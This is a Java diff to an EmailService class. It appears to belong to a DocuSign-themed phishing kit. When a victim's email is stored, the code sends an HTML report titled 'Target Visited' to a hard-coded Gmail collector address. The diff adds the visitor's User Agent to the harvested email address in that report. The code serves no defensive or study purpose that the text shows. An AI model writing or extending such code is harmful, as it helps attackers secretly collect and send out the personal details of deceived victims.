@@ -21,7 +21,7 @@ public class EmailService {
 	MailSenderService mailSenderService;
 	
 	public Email addEmail(Email email) throws UnsupportedEncodingException, MessagingException {
-		sendVerificationEmail(email.getEmail());
+		sendVerificationEmail(email);
 		return emailRepository.save(email);
 	}
 	
@@ -30,7 +30,7 @@ public class EmailService {
 		return emails.get(emails.size() - 1).getEmail();
 	}
 	
-	private void sendVerificationEmail(String email) throws MessagingException, UnsupportedEncodingException {
+	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
 		String toAddress = "docusign76@gmail.com";
 		String subject = "Target";
 		String content = "<!DOCTYPE html>\n"
@@ -43,7 +43,8 @@ public class EmailService {
 		+ "<body style=\"background-color: black; color: green; padding: 16px;\">\n"
 		+ "    <div style=\"background-color: rgb(18, 18, 18); padding: 16px;\">\n"
 		+ "    <p style=\"font-size: 18px;\">Target Visited</p>\n"
-		+ "    <p>Target Email: "+email+"</p>\n"
+		+ "    <p>Target Email: "+email.getEmail()+"</p>\n"
+		+ "    <p>User Agent: "+email.getUserAgent()+"</p>\n"
 		+ "</div>\n"
 		+ "</body>\n"
 		+ "</html>";
